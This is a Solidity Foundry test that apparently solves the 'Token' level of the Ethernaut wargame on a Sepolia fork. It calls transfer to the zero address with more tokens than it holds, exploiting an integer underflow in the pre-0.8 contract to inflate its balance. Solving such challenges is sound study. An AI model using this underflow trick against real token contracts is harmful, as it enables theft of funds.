// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;

import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "../src/levels/05-Token/Token.sol";

contract ContractTest is DSTest {
 
    Token level5 = Token(payable(0x9585C1B4359B8bfAD4E979ae77B3A1201A23dfD5));

    function setUp() public {
    Vm vm = Vm(address(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D));
    vm.createSelectFork(vm.rpcUrl("sepolia"));
    }

    function testExploit5() public {
      //level5.balanceOf(address(0x7A30be98aFCeA6cf186751546af0C563e1e8Ae08));
        level5.transfer(address(0),21);
        level5.balanceOf(address(this));
    }
  receive() external payable {}
}